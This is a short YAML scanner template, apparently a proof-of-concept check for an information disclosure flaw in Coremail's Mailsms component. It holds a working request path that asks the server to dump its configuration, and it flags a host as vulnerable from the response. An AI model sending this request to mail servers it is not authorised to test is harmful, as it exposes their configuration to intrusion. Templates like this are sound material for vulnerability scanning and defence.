id: poc-yaml-coremail-mailsms-info-disclosure
info:
  name: Coremail Mailsms 信息泄露漏洞
  severity: medium
  tags:
  - 两高一弱
  - 信息泄露
  finger: Coremail
  osprey-id: vb_2019_0034
requests:
- method: GET
  path: /mailsms/s?func=ADMIN:appState&dumpConfig=/
  headers: {}
  expression: 'status_code != 404 && contains(body, "/home/coremail") && contains(body,
    "<?xml")

    '
variables: {}
transport: http
